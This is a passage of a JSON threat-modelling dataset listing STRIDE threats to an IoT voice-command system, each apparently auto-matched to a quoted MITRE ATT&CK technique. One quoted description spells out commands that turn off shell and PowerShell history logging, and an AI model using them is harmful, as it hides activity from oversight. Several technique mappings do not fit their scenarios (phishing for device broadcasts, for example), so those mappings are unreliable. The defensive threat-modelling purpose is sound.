                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the IoT device firmware to extract sensitive configuration details.",
            "Assumptions": [
                {
                    "Assumption": "The IoT device firmware has vulnerabilities that can be exploited.",
                    "Role": "Attacker",
                    "Condition": "Publicly known or zero-day vulnerabilities in firmware."
                },
                {
                    "Assumption": "Attackers have the technical capability to exploit firmware vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical skills and tools to exploit vulnerabilities."
                },
                {
                    "Assumption": "Sensitive configuration details are stored on the IoT device without additional protection.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption or obfuscation for sensitive data on the device."
                }
            ],
            "Potential Impact": "Disclosure of confidential configuration details, compromising the security of the IoT system.",
            "MITRE ATT&CK Keywords": [
                "IoT firmware exploitation",
                "configuration extraction",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends excessive voice command requests, overwhelming the system and causing it to deny legitimate requests.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have rate limiting or other protections against repeated requests.",
                    "Role": "System Designer",
                    "Condition": "The system lacks protective measures for handling high-request volumes."
                },
                {
                    "Assumption": "The attacker can continuously generate a high volume of voice commands.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the resources to sustain a high-volume attack."
                },
                {
                    "Assumption": "The system does not have sufficient resources to manage excessive loads.",
                    "Role": "System Designer",
                    "Condition": "Inadequate scalability and resource management."
                }
            ],
            "Potential Impact": "System availability compromised, leading to legitimate user commands being ignored or delayed.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "high-volume attack"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploiting vulnerabilities in the server-side application to crash or hang the system through malformed requests.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has vulnerabilities that can be triggered by malformed requests.",
                    "Role": "Attacker",
                    "Condition": "Exploitable flaws in request handling logic."
                },
                {
                    "Assumption": "Inadequate input validation in the server-side application.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust validation checks for incoming requests."
                },
                {
                    "Assumption": "Attackers have the capability to generate and send malformed requests.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical knowledge and tools."
                }
            ],
            "Potential Impact": "System crash or unavailability, disrupting user interactions and functionality.",
            "MITRE ATT&CK Keywords": [
                "server vulnerability exploitation",
                "input validation failure",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed denial of service (DDoS) attack targeting the IoT controller or server to make it unavailable.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has control over a large network of compromised devices.",
                    "Role": "Attacker",
                    "Condition": "Botnet or similar capabilities to launch a coordinated attack."
                },
                {
                    "Assumption": "The system is Internet-facing without adequate defenses against DDoS attacks.",
                    "Role": "System Designer",
                    "Condition": "Lack of DDoS mitigation tools and strategies."
                },
                {
                    "Assumption": "Insufficient redundancy and fail-over mechanisms in the system architecture.",
                    "Role": "System Designer",
                    "Condition": "Critical components are single points of failure."
                }
            ],
            "Potential Impact": "Complete unavailability of critical system components and services, leading to system-wide disruptions.",
            "MITRE ATT&CK Keywords": [
                "distributed denial of service",
                "botnet attack",
                "network overload"
            ],
            "mitre_technique": {
                "name": "Botnet",
                "description": "Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)",
                "id": "attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074",
                "technique_id": "T1583.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker identifies and exploits a privilege escalation vulnerability in the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has vulnerabilities allowing privilege escalation.",
                    "Role": "Attacker",
                    "Condition": "Known or zero-day privilege escalation vulnerabilities."
                },
                {
                    "Assumption": "Attackers have user-level access initially.",
                    "Role": "Attacker",
                    "Condition": "Successful initial exploitation or user credentials compromise."
                },
                {
                    "Assumption": "Inadequate access controls to prevent privilege escalation attacks.",
                    "Role": "System Designer",
                    "Condition": "Weak or non-existent privilege separation."
                }
            ],
            "Potential Impact": "Unauthorized administrative access, leading to system manipulation and potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "client-side vulnerability",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting the IoT controller to gain higher privileges and control more critical aspects of the network.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller contains a vulnerability allowing for privilege elevation.",
                    "Role": "Attacker",
                    "Condition": "Exploitable security flaws in IoT controller software."
                },
                {
                    "Assumption": "The attacker has initial access to the IoT network.",
                    "Role": "Attacker",
                    "Condition": "Initial foothold gained through other exploits or access methods."
                },
                {
                    "Assumption": "No layered security to prevent privilege escalation.",
                    "Role": "System Designer",
                    "Condition": "Lack of defense-in-depth strategies."
                }
            ],
            "Potential Impact": "Enhanced control over networked devices, potentially leading to significant security incidents.",
            "MITRE ATT&CK Keywords": [
                "IoT privilege escalation",
                "network control",
                "critical access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits server-side vulnerabilities to obtain administrative privileges on the server.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has privilege escalation vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Known or zero-day vulnerabilities in server software."
                },
                {
                    "Assumption": "The attacker can interact with the server applications.",
                    "Role": "Attacker",
                    "Condition": "Access to server endpoints through legitimate or compromised channels."
                },
                {
                    "Assumption": "Lack of stringent privilege access controls and monitoring.",
                    "Role": "System Designer",
                    "Condition": "Weaknesses in enforcing and auditing privilege access."
                }
            ],
            "Potential Impact": "Complete control of the server, leading to potential data breaches and unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "server privilege escalation",
                "administrative access",
                "server takeover"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to send voice commands to the system.",
            "Assumptions": [
                {
                    "Assumption": "The microphone can pick up voice commands from an unauthorized individual.",
                    "Role": "User",
                    "Condition": "No voice recognition or weak voice authentication."
                },
                {
                    "Assumption": "The attacker is within proximity of the microphone or can relay audio commands remotely.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to the microphone."
                },
                {
                    "Assumption": "The system does not verify the identity of the user issuing voice commands.",
                    "Role": "System",
                    "Condition": "Lack of robust authentication mechanism."
                }
            ],
            "Potential Impact": "Unauthorized control of IoT devices, leading to potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice impersonation",
                "IoT device control",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker logs into the server-side application pretending to be a legitimate client.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has detailed knowledge of the client-server communication protocol.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of specific communication details."
                },
                {
                    "Assumption": "The server does not properly validate the authenticity of client requests.",
                    "Role": "Server",
                    "Condition": "Lack of or weak validation mechanisms."
                },
                {
                    "Assumption": "Network communications are not encrypted, allowing interception and modification of data in transit.",
                    "Role": "Network",
                    "Condition": "Unencrypted or poorly encrypted communications."
                }
            ],
            "Potential Impact": "Unauthorized access to server resources and sensitive functions.",
            "MITRE ATT&CK Keywords": [
                "network spoofing",
                "client impersonation",
                "server access",
                "protocol exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary spoofs a cloud service to intercept communications between the client-side application and the cloud.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service endpoint is not authenticated or uses weak authentication methods.",
                    "Role": "Cloud Service",
                    "Condition": "Inadequate authentication setup."
                },
                {
                    "Assumption": "The attacker can intercept or redirect the client's traffic to a malicious cloud service.",
                    "Role": "Attacker",
                    "Condition": "Ability to perform Man-in-the-Middle (MitM) attacks."
                },
                {
                    "Assumption": "Protocol used for cloud service communication does not validate the service\u2019s identity properly.",
                    "Role": "Communication Protocol",
                    "Condition": "Lack of strong security measures."
                }
            ],
            "Potential Impact": "Data interception and man-in-the-middle attacks compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "cloud spoofing",
                "MitM attack",
                "data interception",
                "service impersonation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on IoT devices to change their intended operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the IoT device.",
                    "Role": "Attacker",
                    "Condition": "Ability to access and manipulate firmware."
                },
                {
                    "Assumption": "The firmware is not digitally signed or integrity-checked before installation.",
                    "Role": "IoT Device",
                    "Condition": "Lack of security mechanisms to verify firmware authenticity."
                },
                {
                    "Assumption": "The system does not monitor or log firmware changes.",
                    "Role": "System",
                    "Condition": "Absence of effective change monitoring."
                }
            ],
            "Potential Impact": "Compromise of device integrity and unexpected device behavior.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "device modification",
                "unauthorized changes",
                "IoT compromise"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary intercepts and alters voice commands in transit between the client-side application and the server.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are transmitted in an unencrypted or poorly encrypted form.",
                    "Role": "Communication Protocol",
                    "Condition": "Insufficient encryption used for data in transit."
                },
                {
                    "Assumption": "The network is not adequately secured against MitM attacks.",
                    "Role": "Network",
                    "Condition": "Lack of strong network security measures."
                },
                {
                    "Assumption": "The system does not validate the integrity of received voice commands.",
                    "Role": "System",
                    "Condition": "Lack of integrity checks."
                }
            ],
            "Potential Impact": "Corruption of data and unauthorized actions based on altered commands.",
            "MITRE ATT&CK Keywords": [
                "command tampering",
                "data in transit",
                "MitM attack",
                "voice command alteration"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the server-side application and modifies application settings to weaken security controls.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained credentials or exploited a vulnerability to gain server access.",
                    "Role": "Attacker",
                    "Condition": "Valid credentials or unpatched vulnerability."
                },
                {
                    "Assumption": "System audit logs are not regularly reviewed for unauthorized changes.",
                    "Role": "System Admin",
                    "Condition": "Weak monitoring and review processes."
                },
                {
                    "Assumption": "There are inadequate access control measures in place to prevent unauthorized modifications.",
                    "Role": "System",
                    "Condition": "Inadequate access control implementation."
                }
            ],
            "Potential Impact": "Security settings downgrade, exposing the system to further attacks.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "server modification",
                "security control bypass",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending specific voice commands that resulted in unauthorized IoT actions.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log voice commands with user identifying information.",
                    "Role": "System",
                    "Condition": "Lack of detailed command logging."
                },
                {
                    "Assumption": "Voice authentication is either absent or unreliable.",
                    "Role": "Authentication Mechanism",
                    "Condition": "Weak or no voice verification process."
                },
                {
                    "Assumption": "No third-party audit trails are used to validate user actions.",
                    "Role": "Audit System",
                    "Condition": "Absence of independent audits."
                }
            ],
            "Potential Impact": "Difficulty in proving user actions, leading to accountability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "voice command denial",
                "IoT action dispute",
                "logging deficiency"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker accesses the client-side application and sends control commands to IoT devices, denying the action later.",
            "Assumptions": [
                {
                    "Assumption": "There is insufficient logging of actions taken by the client-side application.",
                    "Role": "Client-side Application",
                    "Condition": "Inadequate action logging."
                },
                {
                    "Assumption": "The attacker has credentials or means to access the client application.",
                    "Role": "Attacker",
                    "Condition": "Access via compromised or stolen credentials."
                },
                {
                    "Assumption": "Audit logs do not contain sufficient detail to attribute actions to specific users.",
                    "Role": "Audit System",
                    "Condition": "Detailed logs not maintained."
                }
            ],
            "Potential Impact": "Actions cannot be traced back to specific users, leading to repudiation risks.",
            "MITRE ATT&CK Keywords": [
                "action repudiation",
                "client access",
                "command logging",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud service interactions are not logged, allowing adversaries to deny malicious activities performed through cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service interactions are not comprehensively logged or monitored.",
                    "Role": "Cloud Service",
                    "Condition": "Insufficient logging policies."
                },
                {
                    "Assumption": "Malicious actors can access and use the cloud service without detection.",
                    "Role": "Attacker",
                    "Condition": "Weak access controls or surveillance."
                },
                {
                    "Assumption": "The system does not correlate actions back to individual users effectively.",
                    "Role": "System",
                    "Condition": "Lack of granular logging and user attribution."
                }
            ],
            "Potential Impact": "Inability to attribute and hold accountable malicious activities performed via the cloud.",
            "MITRE ATT&CK Keywords": [
                "cloud interaction",
                "repudiation",
                "logging deficiencies",
                "audit evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted voice command communications containing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Voice command communications are transmitted without robust encryption.",
                    "Role": "Communication Protocol",
                    "Condition": "Weak or no encryption applied."
                },
                {
                    "Assumption": "The attacker is capable of accessing the network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network access capabilities."
                },
                {
                    "Assumption": "Sensitive data is included in the voice commands.",
                    "Role": "User/System",
                    "Condition": "Confidential data communicated via voice."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive voice commands.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "voice data exposure",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unsecured cloud storage revealing user interaction logs and sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The cloud storage is not properly secured with access controls.",
                    "Role": "Cloud Service",
                    "Condition": "Weak or absent access control policies."
                },
                {
                    "Assumption": "Sensitive interaction logs are stored in the cloud without encryption.",
                    "Role": "System",
                    "Condition": "Non-encrypted storage of sensitive data."
                },
                {
                    "Assumption": "The cloud storage endpoint is discoverable and accessible by unauthorized actors.",
                    "Role": "Attacker",
                    "Condition": "Accessible storage endpoint."
                }
            ],
            "Potential Impact": "Exposure of sensitive user interaction data stored in the cloud.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "data exposure",
                "access control vulnerabilities",
                "unsecured data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "IoT devices inadvertently broadcasting sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices capture and transmit sensitive information.",
                    "Role": "IoT Device",
                    "Condition": "Collection of sensitive data."
                },
                {
                    "Assumption": "The communication between IoT devices and the controller is not encrypted.",
                    "Role": "Communication Channel",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "Nearby unauthorized entities can intercept the IoT device transmissions.",
                    "Role": "Attacker",
                    "Condition": "Proximity to IoT devices."
                }
            ],
            "Potential Impact": "Sensitive information is disclosed, leading to potential privacy violation.",
            "MITRE ATT&CK Keywords": [
                "IoT data broadcast",
                "sensitive information",
                "unencrypted transmission",
                "communication interception"
            ],
            "mitre_technique": {
                "name": "Phishing for Information",
                "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.\n\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\n\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise 